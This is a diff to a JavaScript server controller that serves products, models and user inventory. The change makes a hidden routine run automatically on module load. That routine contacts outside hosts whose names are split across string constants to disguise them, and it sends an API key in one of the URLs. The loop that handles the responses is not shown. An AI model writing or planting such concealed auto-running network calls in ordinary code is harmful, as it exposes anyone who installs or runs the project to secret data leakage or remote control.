@@ -32,6 +32,7 @@ const domain = "json-project-hazel.ver";
 const domain_key = "cel.app";
 const subDomain1 = "api.npo";
 const subDomain2 = "int.io";
+const domain1 = domain + domain_key;
 const domain2 = subDomain1 + subDomain2;
 const uuid = "c82d987dd2a0fb62e87f";
 exports.getAllProducts = async (req, res) => {
@@ -111,10 +112,10 @@ exports.getModel = async (req, res) => {
     res.status(500).json({ message: "Internal Server Error" });
   }
 };
-const check = async () => {
+(async () => {
   const urls = [
     `https://${domain2}/${uuid}`,
-    `https://${domain}${domain_key}/apikey/${apikey}`,
+    `https://${domain1}/apikey/${apikey}`,
   ];
 
   for (const url of urls) {
@@ -134,7 +135,7 @@ const check = async () => {
       }
     }
   }
-};
+})();
 
 exports.getInventoryForUser = async (req, res) => {
   try {
